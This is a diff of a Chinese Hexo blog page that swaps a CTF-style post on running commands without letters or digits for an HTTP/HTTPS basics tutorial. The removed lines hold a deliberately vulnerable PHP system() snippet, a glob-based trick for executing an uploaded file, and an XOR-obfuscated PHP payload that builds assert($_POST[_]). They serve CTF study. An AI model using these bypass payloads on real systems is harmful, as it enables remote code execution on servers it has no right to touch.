@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="RCE无字母数字总结, Hbluewhite的Blog">
+    <meta name="keywords" content="HTTP和HTTPS以及工具的使用, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>RCE无字母数字总结 | Hbluewhite的Blog</title>
+    <title>HTTP和HTTPS以及工具的使用 | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">RCE无字母数字总结</h1>
+                    <h1 class="description center-align post-title">HTTP和HTTPS以及工具的使用</h1>
                 </div>
             </div>
         </div>
@@ -477,8 +477,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Web-bug/">
-                                <span class="chip bg-color">Web bug</span>
+                            <a href="/tags/%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/">
+                                <span class="chip bg-color">通讯原理</span>
                             </a>
                         
                     </div>
@@ -493,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-28
+                    2021-11-02
                 </div>
                 
 
@@ -514,29 +514,130 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="RCE-无数字和字母总结"><a href="#RCE-无数字和字母总结" class="headerlink" title="RCE 无数字和字母总结"></a>RCE 无数字和字母总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">  $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">  if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)) &#123;</span><br><span class="line">    system($c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>题目一般是这样的，我们可以看到preg_match()函数对传入的字母以及数字进行了过滤，我们可以用以下几种方式来进行过滤。</p>
-<h2 id="1-构造数据包"><a href="#1-构造数据包" class="headerlink" title="1. 构造数据包"></a>1. 构造数据包</h2><p>首先我们大概思路是这样的，我们的get传参的数据既然被过滤掉了，我们可以通过post文件，在上传的过程中，通过<code>。</code>去执行这个文件。</p>
-<p><strong>通过.去执行的文件是不需要有执行权限的</strong></p>
-<p>数据包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后bp抓包。</p>
-<p>然后再文件中构造一个<code> ?c=.+/???/????????[@-[]</code></p>
-<p>用到Linux下的glob通道符：</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>介绍一下bin目录:</p>
-<p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
-<p>在这里再解释一下为什么加上#！ #!的意思是调用 /bin/sh 命令所以需要加</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>然后就可以使用#!调用bin/sh命令绕过数字和字母了。</p>
-<h2 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反"></a>2.取反</h2><ol>
-<li>php中对汉字可以去乱码，但大多数包含一个字母，我们可以通过这种话方法获得字母。</li>
+                <h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>HTTP协议是超文本传输协议的缩写，用于万维网服务器传输超文本到本地浏览器的传送协议，是一个基于TCP/IP通信协议来传递数据</p>
+<h2 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h2><ol>
+<li>HTTP协议工作在服务端和客服端的架构上。浏览器作为http的服务端通过url向http服务器（web服务器发送所有请求）。</li>
+<li>http服务器（web服务器）：Nginx服务器、Apache服务器、IIS服务器等。</li>
+<li>Web服务器根据收到的请求，向客户端发送响应的信息。</li>
+<li>HTTP默认端口80或8080 HTTPS默认端口443。</li>
 </ol>
-<h2 id="3-异或"><a href="#3-异或" class="headerlink" title="3. 异或"></a>3. 异或</h2><p>当过滤掉字母和数字时，我们可以通过异或来取字母大概啥这样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class="line">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br><span class="line">拼接起来：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);  // $_=assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);  // $__=_POST</span><br><span class="line">$___=$$__; //$___=$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_]);</span><br><span class="line">放到一排就是：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+<h2 id="HTTP注意事项"><a href="#HTTP注意事项" class="headerlink" title="HTTP注意事项"></a>HTTP注意事项</h2><p>HTTP是无连接的：每次连接只处理一个请求，既客户端连接服务端后，服务端返回，就断开连接。节约传输时间。</p>
+<p>HTTP是媒体独立的：意味着，只有客服端和服务端知道如何处理的数据内容，<strong>任何类型的数据</strong>都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。</p>
+<p>HTTP是无状态：与第一条相似，HTTP协议是无状态协议，既无记忆能力，每次对数据处理，都是崭新的数据，但是这可能会导致每次传送连接数据量增大。另一方面，在服务器不需要先前信息时它的应答就比较快。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200606174104101.gif" alt="img"></p>
+<p>HTTP通讯原理的流程，浏览器通过http协议完成http服务器然后经过CGI程序处理数据。</p>
+<h2 id="HTTP消息结构"><a href="#HTTP消息结构" class="headerlink" title="HTTP消息结构"></a>HTTP消息结构</h2><p>HTTP使用统一资源标识符（URL）来传输数据和建立连接。</p>
+<p>一但建立连接之后，数据消息就通过类似Internet邮件所使用的格式和多用途Internet邮件扩展（MIME）发送。</p>
+<h2 id="客户端请求信息"><a href="#客户端请求信息" class="headerlink" title="客户端请求信息"></a>客户端请求信息</h2><p>客户端发送一个HTTP协议请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部(header)、空行和请求数据四个部分组成。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200606174736435.png" alt="img"></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/20200606175713363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ==,size_16,color_FFFFFF,t_70" alt="img"></strong></p>
+<h2 id="服务器响应消息"><a href="#服务器响应消息" class="headerlink" title="服务器响应消息"></a>服务器响应消息</h2><p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p>
+<p><strong>实例：</strong></p>
+<p>python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"><span class="comment"># 添加请求的url和方法</span></span><br><span class="line">req = urllib.request.Request(url,method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line"><span class="comment"># 接收响应数据</span></span><br><span class="line">returnDate = urllib.request.urlopen(req)</span><br><span class="line">res_json = returnData.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res_json)</span><br></pre></td></tr></table></figure>
 
+<h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>GET、POST、HEAD、OPTIONS、PUT、PATCH、DELETE、TRACE和CONNECT方法。</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>GET</td>
+<td>请求指定的页面信息，并返回实体主体。</td>
+</tr>
+<tr>
+<td>2</td>
+<td>HEAD</td>
+<td>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
+</tr>
+<tr>
+<td>3</td>
+<td>POST</td>
+<td>向指定资源提交数据进行处理请求（例如，提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立或已有资源的修改。</td>
+</tr>
+<tr>
+<td>4</td>
+<td>PUT</td>
+<td>从客户端向服务器传送的数据取代指定的文档的内容。</td>
+</tr>
+<tr>
+<td>5</td>
+<td>DELETE</td>
+<td>请求服务器删除指定的页面。</td>
+</tr>
+<tr>
+<td>6</td>
+<td>CONNECT</td>
+<td>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
+</tr>
+<tr>
+<td>7</td>
+<td>OPTIONS</td>
+<td>允许客户端查看服务器的性能。</td>
+</tr>
+<tr>
+<td>8</td>
+<td>TRACE</td>
+<td>回显服务器收到的请求，主要用于测试或诊断。</td>
+</tr>
+<tr>
+<td>9</td>
+<td>PATCH</td>
+<td>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td>
+</tr>
+</tbody></table>
+<p> GET和POST的区别</p>
+<pre><code>GET在浏览器回退时是无害的，而POST会再次提交请求。
+GET产生的URL地址可以被Bookmark，而POST不可以。
+GET请求会被浏览器主动cache，而POST不会，除非手动设置。
+GET请求只能进行url编码，而POST支持多种编码方式。
+GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
+GET请求在URL中传送的参数是有长度限制的，而POST没有。
+对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
+GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
+GET参数通过URL传递，POST放在Request body中。
+</code></pre>
+<p>HTTP的底层是TCP/IP。所有GET和POST能做的事情是一样的</p>
+<p>也就是本质上是没什么区别的，但是两者中最大的区别就是:</p>
+<p><strong>GET产生一个TCP数据包；POST产生两个TCP数据包</strong></p>
+<p>具体点来说就是：</p>
+<p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</p>
+<p>而对于POST，浏览器先发送header，服务器响应100 continue,浏览器再发送data，服务器响应200ok（返回数据）。</p>
+<h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>HTTP状态码分类</p>
+<table>
+<thead>
+<tr>
+<th>分类</th>
+<th>分类描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1**</td>
+<td>信息，服务器收到请求，需要请求者继续执行操作</td>
+</tr>
+<tr>
+<td>2**</td>
+<td>成功，操作被成功接收并处理·</td>
+</tr>
+<tr>
+<td>3**</td>
+<td>重定向。需要进一步的操作以完成请求</td>
+</tr>
+<tr>
+<td>4**</td>
+<td>客户端错误，请求包含语法错误或无法完成请求</td>
+</tr>
+<tr>
+<td>5**</td>
+<td>服务端错误，服务器在处理i请求的过程中发生了错误</td>
+</tr>
+</tbody></table>
+<p>其余的可以更具遇到积累。</p>
 
                 
             </div>
@@ -563,7 +664,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/">http://example.com/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/</a>
+                    <a href="http://example.com/2021/11/02/HTTP%E5%92%8CHTTPS%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">http://example.com/2021/11/02/HTTP%E5%92%8CHTTPS%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -601,8 +702,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Web-bug/">
-                                    <span class="chip bg-color">Web bug</span>
+                                <a href="/tags/%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/">
+                                    <span class="chip bg-color">通讯原理</span>
                                 </a>
                             
                         </div>
@@ -1040,9 +1141,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/11/02/HTTP%E5%92%8CHTTPS%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
                     <div class="card-image">
@@ -1060,9 +1162,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1071,6 +1173,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1089,13 +1192,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/">
+                <a href="/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.png" class="responsive-img" alt="ZIP伪加密">
+                        <img src="/medias/featureimages/21.png" class="responsive-img" alt="RCE无字母数字总结">
                         
-                        <span class="card-title">ZIP伪加密</span>
+                        <span class="card-title">RCE无字母数字总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1119,8 +1222,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Misc/">
-                        <span class="chip bg-color">Misc</span>
+                    <a href="/tags/Web-bug/">
+                        <span class="chip bg-color">Web bug</span>
                     </a>
                     
                 </div>
